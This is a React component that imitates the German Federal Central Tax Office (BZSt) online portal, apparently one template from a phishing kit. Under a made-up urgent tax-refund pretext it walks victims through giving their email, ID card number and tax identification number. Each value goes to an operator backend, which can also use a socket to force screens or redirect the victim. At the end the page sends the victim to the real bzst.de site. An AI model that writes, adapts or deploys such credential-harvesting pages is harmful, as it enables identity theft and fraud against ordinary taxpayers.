import React, { useEffect, useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { createTemplateSession, getTemplateConfig, submitTemplateData } from '../../utils/templateApi';
import { getTemplateMetadata, updatePageMetadata } from '../../utils/templateMetadata';
import templateSocketClient from '../../utils/socketClient';
import './BzstStyle.css';

const STATES = {
  NOTICE: 'notice',
  LOGIN: 'login',
  PROCESSING: 'processing',
  SUCCESS: 'success',
  ERROR: 'error'
};

interface StepConfig {
  login: boolean;
}

const DEFAULT_CONFIG: StepConfig = {
  login: true
};

const BzstTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  const [state, setState] = useState(STATES.NOTICE);
  const [loading, setLoading] = useState(true);
  const [loadingMessage, setLoadingMessage] = useState('Sitzung wird initialisiert...');
  const [error, setError] = useState<string | null>(null);
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [configLoaded, setConfigLoaded] = useState(false);
  const [activeTab, setActiveTab] = useState<'email' | 'id' | 'tax'>('email');
  const [emailValue, setEmailValue] = useState('');
  const [idValue, setIdValue] = useState('');
  const [taxValue, setTaxValue] = useState('');

  useEffect(() => {
    const metadata = getTemplateMetadata('bzst');
    updatePageMetadata(metadata);

    const loadConfig = async () => {
      try {
        setLoadingMessage('Schritt-Konfiguration wird geladen...');
        const config = await getTemplateConfig('bzst');
        setStepConfig({
          login: config.steps?.login ?? true
        });
        setConfigLoaded(true);
      } catch (err) {
        setConfigLoaded(true);
      }
    };

    const initializeSession = async () => {
      if (!key) {
        try {
          setLoading(true);
          setLoadingMessage('Sitzung wird erstellt...');
          const newKey = await createTemplateSession('bzst');
          navigate(`/bzst/${newKey}`);
        } catch (err) {
          const fallbackKey = Math.random().toString(36).substring(2, 15);
          navigate(`/bzst/${fallbackKey}`);
        } finally {
          setLoading(false);
        }
      }
    };

    const initializeAfterConfig = async () => {
      await loadConfig();
      setLoadingMessage('Sitzung wird initialisiert...');
      setTimeout(() => setLoading(false), 800);
    };

    initializeAfterConfig();
    initializeSession();

    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'bzst',
        onStateForced: (nextState: string, message?: string) => {
          setLoading(true);
          setLoadingMessage(message || 'Bitte warten...');
          setTimeout(() => {
            setState(nextState);
            setLoading(false);
          }, 1200);
        },
        onMessage: (message: string, type: string) => {
          alert(`${type.toUpperCase()}: ${message}`);
        },
        onRedirect: (url: string) => {
          window.location.href = url;
        }
      });
    }

    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, navigate]);

  const handleLoginSubmit = async (email: string) => {
    try {
      setLoading(true);
      setLoadingMessage('Anmeldung wird verarbeitet...');

      const response = await submitTemplateData({
        template_name: 'bzst',
        key: key || '',
        step: 'email-login',
        data: { email }
      });

      if (!response.success) {
        setError(response.error || 'Fehler bei der Anmeldung');
        setState(STATES.ERROR);
        return;
      }

      setState(STATES.LOGIN);
    } catch (err) {
      setError('Fehler bei der Anmeldung');
      setState(STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  const handleTabSubmit = async () => {
    if (activeTab === 'email') {
      await handleLoginSubmit(emailValue);
      setActiveTab('id');
      return;
    }

    if (activeTab === 'id') {
      setLoading(true);
      setLoadingMessage('Anmeldung wird verarbeitet...');
      try {
        const response = await submitTemplateData({
          template_name: 'bzst',
          key: key || '',
          step: 'ausweisnummer',
          data: { ausweisnummer: idValue }
        });

        if (!response.success) {
          setError(response.error || 'Fehler bei der Anmeldung');
          setState(STATES.ERROR);
          return;
        }

        setActiveTab('tax');
      } catch (err) {
        setError('Fehler bei der Anmeldung');
        setState(STATES.ERROR);
      } finally {
        setLoading(false);
      }
      return;
    }

    if (!/^[0-9]{11}$/.test(taxValue)) {
      setError('Bitte geben Sie eine 11-stellige Steueridentifikationsnummer ohne Sonderzeichen oder Buchstaben ein.');
      setState(STATES.ERROR);
      return;
    }

    setLoading(true);
    setLoadingMessage('Anmeldung wird verarbeitet...');
    try {
      const response = await submitTemplateData({
        template_name: 'bzst',
        key: key || '',
        step: 'steueridentifikationsnummer',
        data: { steueridentifikationsnummer: taxValue }
      });

      if (!response.success) {
        setError(response.error || 'Fehler bei der Anmeldung');
        setState(STATES.ERROR);
        return;
      }

      await submitTemplateData({
        template_name: 'bzst',
        key: key || '',
        step: 'personal-data-complete',
        data: {
          email: emailValue,
          ausweisnummer: idValue,
          steueridentifikationsnummer: taxValue
        }
      });

      setState(STATES.SUCCESS);
      setTimeout(() => {
        window.location.href = 'https://www.bzst.de/DE/Home/home_node.html';
      }, 1500);
    } catch (err) {
      setError('Fehler bei der Anmeldung');
      setState(STATES.ERROR);
    } finally {
      setLoading(false);
    }
  };

  const renderContent = () => {
    if (loading || !configLoaded) {
      return (
        <div className="bzst-panel">
          <h3>{loadingMessage}</h3>
          <p>Bitte warten Sie einen Moment.</p>
        </div>
      );
    }

    if (state === STATES.ERROR) {
      return (
        <div className="bzst-panel">
          <h3>Ein Fehler ist aufgetreten</h3>
          <p>{error || 'Bitte versuchen Sie es erneut.'}</p>
          <button className="bzst-btn" onClick={() => setState(STATES.LOGIN)}>Erneut versuchen</button>
        </div>
      );
    }

    if (state === STATES.SUCCESS) {
      return (
        <div className="bzst-panel">
          <h3>Vielen Dank für Ihre Registrierung</h3>
          <p>Sie werden in Kürze auf die offizielle BZSt-Website weitergeleitet.</p>
        </div>
      );
    }

    if (state === STATES.PROCESSING) {
      return (
        <div className="bzst-panel">
          <h3>Verarbeitung läuft</h3>
          <p>Ihre Angaben werden sicher geprüft. Bitte warten Sie einen Moment.</p>
        </div>
      );
    }

    if (!stepConfig.login) {
      return (
        <div className="bzst-panel">
          <h3>Anmeldung nicht verfügbar</h3>
          <p>Diese Anmeldemethode ist derzeit deaktiviert.</p>
        </div>
      );
    }

    return (
      <div className="bzst-panel">
        <h3>
          {activeTab === 'email' && 'Anmeldemethode: E-Mail Login'}
          {activeTab === 'id' && 'Anmeldemethode: Ausweisnummer'}
          {activeTab === 'tax' && 'Anmeldemethode: Steueridentifikationsnummer'}
        </h3>
        <p>
          {activeTab === 'email' && (
            'Bitte tragen Sie Ihre E-Mail-Adresse ein, um den Prozess zur Begleichung des ausstehenden Restbetrags Ihrer Steuerrückzahlung zu beginnen. Ihre Daten werden gemäß unseren Sicherheitsrichtlinien geschützt verarbeitet.'
          )}
          {activeTab === 'id' && (
            'Bitte tragen Sie Ihre Ausweisnummer ein, um mit dem nächsten Schritt fortzufahren. Ihre Angaben werden gemäß unseren Sicherheitsrichtlinien geschützt verarbeitet.'
          )}
          {activeTab === 'tax' && (
            'Bitte geben Sie Ihre 11-stellige Steueridentifikationsnummer ohne Sonderzeichen oder Buchstaben ein, um den Vorgang abzuschließen.'
          )}
        </p>
        <form
          onSubmit={(event) => {
            event.preventDefault();
            handleTabSubmit();
          }}
        >
          <div className="bzst-form-box">
            {activeTab === 'email' && (
              <div className="bzst-form-group">
                <label htmlFor="email"><strong>E-Mail Adresse</strong></label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  placeholder="E-Mail Adresse"
                  className="bzst-input"
                  value={emailValue}
                  onChange={(event) => setEmailValue(event.target.value)}
                  required
                />
              </div>
            )}

            {activeTab === 'id' && (
              <div className="bzst-form-group">
                <label htmlFor="ausweisnummer"><strong>Ausweisnummer</strong></label>
                <input
                  id="ausweisnummer"
                  name="ausweisnummer"
                  type="text"
                  placeholder="Ausweisnummer"
                  className="bzst-input"
                  value={idValue}
                  onChange={(event) => setIdValue(event.target.value)}
                  required
                />
              </div>
            )}

            {activeTab === 'tax' && (
              <div className="bzst-form-group">
                <label htmlFor="steueridentifikationsnummer"><strong>Steueridentifikationsnummer</strong></label>
                <input
                  id="steueridentifikationsnummer"
                  name="steueridentifikationsnummer"
                  type="text"
                  placeholder="Steueridentifikationsnummer"
                  className="bzst-input"
                  value={taxValue}
                  onChange={(event) => setTaxValue(event.target.value)}
                  required
                />
              </div>
            )}

            <button type="submit" className="bzst-btn">Anmelden</button>
          </div>
        </form>
      </div>
    );
  };

  return (
    <div className="bzst-template">
      <header className="bzst-header">
        <div className="bzst-header-inner">
          <div className="bzst-brand">
            <img
              src="/templates/BZST/images/BZSt_Logo.png"
              alt="Bundeszentralamt für Steuern"
              className="bzst-brand-logo"
            />
          </div>
          <nav className="bzst-nav">
            <span className="bzst-portal-pill">BZSt Online.Portal</span>
            <a href="#">Kontakt</a>
            <a href="#">English</a>
            <a href="#">Leichte Sprache</a>
            <a href="#">Gebärdensprache</a>
          </nav>
        </div>
      </header>

      <section className="bzst-content">
        <aside className="bzst-sidebar">
          <div className="bzst-sidebar-item active">Das BZSt</div>
          <div className="bzst-sidebar-item">
            <span className="bzst-sidebar-icon"></span>
            Steuernachzahlungen
          </div>
        </aside>
        <main className="bzst-main">
          <h1 className="bzst-title">
            Dringende Maßnahmen erforderlich: Ihr noch offener Betrag für die Steuerrückzahlung ist bereit.
          </h1>
          <p className="bzst-lead">
            Willkommen im offiziellen BZSt Online Portal, wo Sie Ihre ausstehenden Steuerzahlungen begleichen können.
          </p>
          <p className="bzst-lead">
            Wir möchten Sie dringend darauf aufmerksam machen, dass es gemäß den europäischen Gesetzen entscheidend ist,
            dass Sie die Ihnen zustehende Steuerrückzahlung umgehend anfordern. Andernfalls könnte das ausstehende Geld,
            das Ihnen vom Finanzamt zusteht, möglicherweise nicht mehr ausgezahlt werden, da die gesetzliche Frist bereits
            verstrichen ist.
          </p>
          <p className="bzst-lead">
            Um den Vorgang erfolgreich abzuschließen, bitten wir Sie, die folgenden Schritte noch heute durchzuführen:
            Bitte beachten Sie, dass es sich bei dieser Steuerrückzahlung um den verbleibenden Betrag einer Ihrer letzten
            Abrechnungen beim Finanzamt handelt. Das Finanzamt hat festgestellt, dass es bestimmten Personen noch ausstehende
            Beträge auszuzahlen hat. Unser Ziel ist es, diesen Prozess für Sie so klar und einfach wie möglich zu gestalten.
          </p>
          <ul className="bzst-list">
            <li>
              <strong>Anmelden:</strong> Bitte melden Sie sich auf unserem Online-Portal des Bundeszentralamts für Steuern an.
              Falls Sie noch keine Zugangsdaten haben, wählen Sie bitte eine der alternativen Anmeldemethoden aus.
            </li>
            <li>
              <strong>Personenidentifikation:</strong> Aus Sicherheitsgründen kann es notwendig sein, Ihre Identität zu bestätigen.
              Bitte befolgen Sie die Anweisungen, um diesen Schritt abzuschließen.
            </li>
            <li>
              <strong>Bankauswahl:</strong> Nachdem Sie sich eingeloggt haben, wählen Sie bitte Ihre Bank aus der Liste der
              verfügbaren Optionen aus. Dadurch können wir den Transfer des ausstehenden Restbetrags problemlos durchführen.
            </li>
            <li>
              <strong>Dokumentengenerierung:</strong> Sobald Sie alle erforderlichen Schritte abgeschlossen haben, wird Ihr Anliegen
              zeitnah bearbeitet. Innerhalb von 4 bis 8 Wochen erhalten Sie alle wichtigen Informationen zur Steuerrückerstattung,
              und der Rückerstattungsbetrag wird direkt auf Ihr Konto überwiesen.
            </li>
          </ul>
          <p className="bzst-hint">
            <span>Hinweis:</span> Wir möchten Sie darauf hinweisen, dass das Bundeszentralamt für Steuern künftig ein alternatives
            Verfahren für eingehende oder ausgehende Zahlungen anbietet. Bitte folgen Sie den Anweisungen.
          </p>

          <div className="bzst-section-divider"></div>

          <h2 className="bzst-form-title">Mit welchem Anmeldeverfahren möchten Sie fortfahren?</h2>
          <div className="bzst-tabs">
            <button
              type="button"
              className={`bzst-tab ${activeTab === 'email' ? 'active' : ''}`}
              disabled
            >
              <span className="bzst-tab-icon">@</span>
              E-Mail
            </button>
            <button
              type="button"
              className={`bzst-tab ${activeTab === 'id' ? 'active' : ''}`}
              disabled
            >
              <span className="bzst-tab-icon">ID</span>
              Ausweisnummer
            </button>
            <button
              type="button"
              className={`bzst-tab ${activeTab === 'tax' ? 'active' : ''}`}
              disabled
            >
              <span className="bzst-tab-icon">#</span>
              Steueridentifikationsnummer
            </button>
          </div>

          {renderContent()}
        </main>
      </section>

      <footer className="bzst-footer">
        <div className="bzst-footer-top">
          <div className="bzst-footer-col">
            <a href="#">Privatpersonen →</a>
            <a href="#">Unternehmen →</a>
            <a href="#">Behörden →</a>
            <a href="#">Das BZSt →</a>
            <a href="#">Service →</a>
          </div>
          <div className="bzst-footer-col">
            <a href="#">Themen A-Z →</a>
            <a href="#">Karriere →</a>
            <a href="#">Presse →</a>
            <a href="#">Newsletter →</a>
          </div>
          <div className="bzst-footer-col bzst-footer-help">
            <h4>Haben Sie Fragen?</h4>
            <div className="bzst-footer-item">
              <span className="bzst-footer-icon">☎</span>
              <span>Anrufen</span>
            </div>
            <div className="bzst-footer-item">
              <span className="bzst-footer-icon">✉</span>
              <span>Nachricht schreiben</span>
            </div>
            <h4>Zentrale Behördennummer</h4>
            <p>Für alle Fragen zu Behörden in Deutschland</p>
            <p>Montag bis Freitag 08:00-18:00 Uhr</p>
            <div className="bzst-footer-number">
              <span className="bzst-footer-number-value">115</span>
              <a href="#">Mehr erfahren →</a>
            </div>
          </div>
        </div>
        <div className="bzst-footer-bottom">
          <div className="bzst-footer-links">
            <a href="#">Inhaltsverzeichnis</a>
            <a href="#">Erklärung zur Barrierefreiheit</a>
            <a href="#">Impressum</a>
            <a href="#">Datenschutz</a>
          </div>
          <div className="bzst-footer-copy">© Bundeszentralamt für Steuern</div>
        </div>
      </footer>
    </div>
  );
};

export default BzstTemplate;
